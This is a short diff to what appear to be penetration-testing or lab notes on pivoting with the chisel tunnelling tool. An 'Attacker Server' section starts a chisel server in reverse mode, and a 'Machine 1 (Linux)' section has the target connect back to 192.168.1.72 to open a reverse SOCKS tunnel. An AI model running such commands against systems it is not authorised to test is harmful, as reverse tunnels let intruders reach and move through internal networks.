@@ -1,5 +1,5 @@
 ## Attacker Server
-./chisel_1.9.1_linux_amd64 server -p 8001 --reverse -v --keepalive 5s --socks5 25000
+./chisel_1.9.1_linux_amd64 server -p 8001 --reverse -v --keepalive 5s
 
 ## Machine 1 (Linux)
 chisel client 192.168.1.72 8001 --reverse R:socks:2000
